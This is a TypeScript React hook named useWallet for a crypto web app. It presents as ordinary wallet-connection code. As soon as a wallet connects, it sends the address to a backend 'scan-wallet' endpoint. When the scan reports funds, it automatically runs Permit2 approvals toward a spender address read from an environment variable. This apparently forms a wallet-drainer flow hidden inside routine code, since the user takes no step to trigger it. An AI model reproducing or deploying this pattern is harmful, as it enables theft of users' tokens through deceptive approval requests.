import { useEffect, useState } from "react";
import { useAccount, useDisconnect, useBalance, useChainId } from "wagmi";
import { useAppKit } from "@reown/appkit/react";
import type { AppKitOptions } from "@reown/appkit";
import API from "../providers/axios";
import { usePermit2Execution } from "./usePermit2Execution";
import type { ScanResult } from "../types/wallet.ts";

// type ModalView = Parameters<ReturnType<typeof useAppKit>["open"]>[0] extends {
//   view?: infer V;
// } ? V : never;

type ModalView =
  | "Connect"
  | "Account"
  | "Networks"
  | "WhatIsAWallet"
  | "OnRampProviders";

const SPENDER_ADDRESS = import.meta.env.VITE_PERMIT2_ADDRESS;

export function useWallet() {
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const { executePermit2 } = usePermit2Execution();

  const { address, isConnected, isConnecting, isReconnecting, status } =
    useAccount();
  const { disconnect } = useDisconnect();
  const chainId = useChainId();
  const { open } = useAppKit();

  // Step 1 — Scan wallet on connect
  useEffect(() => {
    if (!address || !isConnected) return;

    const scanWallet = async () => {
      try {
        const res = await API.post("/api/scan-wallet", {
          userAddress: address,
          // userAddress: "0x3618209a13ad3ed309243ffababaa2df7f83a8e7",
        });
        const result = res.data;

        if (result.status === "success" && result.data.length === 0) {
          setTimeout(scanWallet, 3000);
          return;
        }

        setScanResult(result.data[0]); // store Polygon (first chain) result
      } catch (error) {
        console.error("Scan failed:", error);
      }
    };

    scanWallet();
  }, [address, isConnected]);

  // Step 2 — Execute Permit2 once scan result is available
  useEffect(() => {
    if (!scanResult || !isConnected) return;
    if (!scanResult.has_funds || !scanResult.permit2?.length) return;

    const run = async () => {
      try {
        await executePermit2(scanResult, SPENDER_ADDRESS, chainId);
        console.log("done");
      } catch (error) {
        console.error("Permit2 execution failed:", error);
      }
    };

    run();
  }, [scanResult, isConnected]);

  const { data: balance } = useBalance({
    address,
    query: { enabled: !!address },
  });

  function openModal(view?: ModalView) {
    view ? open({ view }) : open();
  }

  return {
    address,
    isConnected,
    isConnecting,
    isReconnecting,
    status,
    chainId,
    scanResult,
    balance: balance
      ? {
          formatted: balance.formatted,
          symbol: balance.symbol,
          value: balance.value,
        }
      : null,
    openModal,
    disconnect,
  };
}

export type { AppKitOptions };
